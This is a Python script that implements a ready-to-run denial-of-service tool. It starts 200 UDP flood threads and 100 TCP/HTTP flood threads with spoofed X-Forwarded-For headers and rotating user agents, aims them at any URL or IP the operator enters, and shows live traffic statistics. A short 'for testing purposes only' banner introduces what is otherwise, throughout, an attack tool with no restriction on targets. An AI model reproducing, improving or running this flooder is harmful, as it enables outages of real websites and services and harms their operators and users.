# attack_script.py
import socket
import random
import time
import threading
from urllib.parse import urlparse

class TrafficAttack:
    def __init__(self, target, port, duration):
        self.target = target
        self.port = port if port else 80
        self.duration = duration
        self.running = False
        self.packets_sent = 0
        self.bytes_sent = 0
        self.threads = []
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) Firefox/121.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edge/120.0.0.0"
        ]
    
    def create_http_packet(self):
        """Create HTTP packet with heavy headers (maximum traffic)"""
        path = "/" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=random.randint(5, 20)))
        headers = [
            f"GET {path} HTTP/1.1",
            f"Host: {self.target}",
            f"User-Agent: {random.choice(self.user_agents)}",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language: en-US,en;q=0.9",
            "Accept-Encoding: gzip, deflate, br",
            f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            f"Cache-Control: no-cache",
            f"Connection: keep-alive",
            f"Content-Length: {random.randint(100, 1000)}",
            "", ""
        ]
        return "\r\n".join(headers).encode()
    
    def udp_flood(self):
        """UDP flood attack (raw traffic)"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65535)
        data = random._urandom(1490)  # 1490 byte packets
        
        while self.running:
            try:
                sock.sendto(data, (self.target, self.port))
                self.packets_sent += 1
                self.bytes_sent += 1490
            except:
                pass
    
    def tcp_flood(self):
        """TCP flood with heavy HTTP headers (high traffic)"""
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                sock.connect((self.target, self.port))
                
                # Send multiple requests in one connection
                for _ in range(random.randint(3, 8)):
                    packet = self.create_http_packet()
                    sock.send(packet)
                    self.packets_sent += 1
                    self.bytes_sent += len(packet)
                    time.sleep(0.001)  # Prevent connection drop
                
                sock.close()
            except:
                pass
    
    def start(self):
        """Start attack with 300 threads (maximum traffic)"""
        self.running = True
        self.packets_sent = 0
        self.bytes_sent = 0
        
        # 60% UDP + 40% TCP for maximum traffic
        for i in range(200):
            t = threading.Thread(target=self.udp_flood)
            t.daemon = True
            t.start()
            self.threads.append(t)
        
        for i in range(100):
            t = threading.Thread(target=self.tcp_flood)
            t.daemon = True
            t.start()
            self.threads.append(t)
        
        return self
    
    def stop(self):
        """Stop the attack"""
        self.running = False
        for t in self.threads:
            try:
                t.join(timeout=0.5)
            except:
                pass
        self.threads.clear()
    
    def get_stats(self):
        """Get real-time statistics"""
        return {
            "packets": self.packets_sent,
            "bytes": self.bytes_sent,
            "mb": self.bytes_sent / (1024 * 1024),
            "gb": self.bytes_sent / (1024 * 1024 * 1024)
        }


def get_target():
    """Get target URL/IP from user"""
    while True:
        target = input("🎯 Enter target URL or IP (e.g., example.com or 192.168.1.1): ").strip()
        if target:
            # Remove protocol if exists
            if target.startswith("http://") or target.startswith("https://"):
                parsed = urlparse(target)
                target = parsed.netloc or parsed.path
                target = target.split("/")[0]
            return target
        print("❌ Please enter a valid URL or IP!")


def get_port():
    """Get port from user"""
    while True:
        try:
            port_input = input("🔌 Enter target port (default 80): ").strip()
            if not port_input:
                return 80
            port = int(port_input)
            if 1 <= port <= 65535:
                return port
            print("❌ Port must be between 1 and 65535!")
        except ValueError:
            print("❌ Please enter a valid number!")


def get_duration():
    """Get attack duration from user (max 120 seconds)"""
    while True:
        try:
            duration_input = input("⏱️ Enter attack duration in seconds (max 120): ").strip()
            if not duration_input:
                print("❌ Please enter a duration!")
                continue
            duration = int(duration_input)
            if duration <= 0:
                print("❌ Duration must be greater than 0!")
            elif duration > 120:
                print("⚠️ Duration exceeds 120 seconds! Setting to maximum 120 seconds.")
                return 120
            else:
                return duration
        except ValueError:
            print("❌ Please enter a valid number!")


def show_progress(attack_obj, target, port, duration):
    """Show attack progress"""
    start_time = time.time()
    last_packets = 0
    last_bytes = 0
    
    print("\n" + "="*60)
    print(f"🔥 Attack in progress...")
    print("="*60)
    
    while time.time() - start_time < duration:
        stats = attack_obj.get_stats()
        elapsed = int(time.time() - start_time)
        remaining = duration - elapsed
        
        # Calculate speed
        speed_packets = stats["packets"] - last_packets
        speed_bytes = stats["bytes"] - last_bytes
        speed_mbps = (speed_bytes * 8) / (1024 * 1024)  # Convert to Mbps
        
        last_packets = stats["packets"]
        last_bytes = stats["bytes"]
        
        # Progress percentage
        progress = int((elapsed / duration) * 100)
        bar = "█" * (progress // 5) + "░" * (20 - (progress // 5))
        
        # Display status
        print(f"\r[{bar}] {progress}% | "
              f"📦 {stats['packets']:,} packets | "
              f"📊 {stats['mb']:.2f} MB | "
              f"⚡ {speed_mbps:.2f} Mbps | "
              f"⏱️ {remaining}s remaining", end="")
        
        time.sleep(2)
    
    print("\n" + "="*60)
    return True


def main():
    """Main function"""
    print("\n" + "="*60)
    print("🔥   Heavy Traffic Test Tool   🔥")
    print("="*60)
    print("⚠️  For testing purposes only on test websites!")
    print("="*60 + "\n")
    
    # Get information from user
    target = get_target()
    port = get_port()
    duration = get_duration()
    
    # Final confirmation
    print("\n" + "-"*60)
    print("📋 Attack Information:")
    print(f"   🎯 Target: {target}")
    print(f"   🔌 Port: {port}")
    print(f"   ⏱️ Duration: {duration} seconds")
    print(f"   📡 Method: TCP+UDP Flood (Heavy)")
    print("-"*60)
    
    confirm = input("\n✅ Start the attack? (y/n): ").strip().lower()
    if confirm != 'y':
        print("❌ Attack cancelled!")
        return
    
    # Start attack
    print("\n⏳ Preparing and starting attack...")
    attack_obj = TrafficAttack(target, port, duration)
    attack_obj.start()
    
    try:
        # Show progress
        show_progress(attack_obj, target, port, duration)
    except KeyboardInterrupt:
        print("\n\n⚠️ Attack stopped by user!")
    finally:
        # Stop attack
        attack_obj.stop()
    
    # Final statistics
    final_stats = attack_obj.get_stats()
    print("\n" + "="*60)
    print("✅ Attack completed!")
    print("="*60)
    print(f"📊 Final Statistics:")
    print(f"   📦 Total packets: {final_stats['packets']:,}")
    print(f"   📊 Total traffic: {final_stats['mb']:.2f} MB ({final_stats['gb']:.3f} GB)")
    print(f"   ⏱️ Duration: {duration} seconds")
    print(f"   🎯 Target: {target}")
    print("="*60)
    print("🔒 Attack stopped.")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n⚠️ Program closed!")
